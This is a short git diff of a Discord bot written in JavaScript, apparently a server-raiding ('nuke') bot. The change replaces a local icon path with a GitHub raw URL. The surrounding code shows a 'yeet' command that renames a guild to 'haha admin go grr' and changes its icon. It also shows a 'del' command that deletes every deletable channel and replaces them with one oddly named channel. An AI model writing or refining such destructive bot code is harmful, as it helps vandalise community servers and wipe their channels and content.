@@ -25,7 +25,7 @@ client.on("message", (message) => {
     switch(comando) {
         case 'yeet':
 	     message.delete();
-	     message.guild.setIcon(`./image.png`);
+	     message.guild.setIcon(`https://github.com/shidemuri/tefoco-v3/blob/master/image.png?raw=true`);
 	     if (!args[0]) mode = `haha admin go grr`;
              if (args[0]) mode = args.slice(0, 32).join(` `)
              message.guild.setName(`${mode}`);
@@ -45,7 +45,7 @@ client.on("message", (message) => {
 	break;
         case "del":
             message.delete();
-            message.guild.setIcon(`./image.png`)
+            message.guild.setIcon(`https://github.com/shidemuri/tefoco-v3/blob/master/image.png?raw=true`)
             message.guild.channels.cache.forEach(m =>{if(m.deletable) m.delete()});
             message.guild.channels.create(`\uA672`, {type: `text`})
         break;
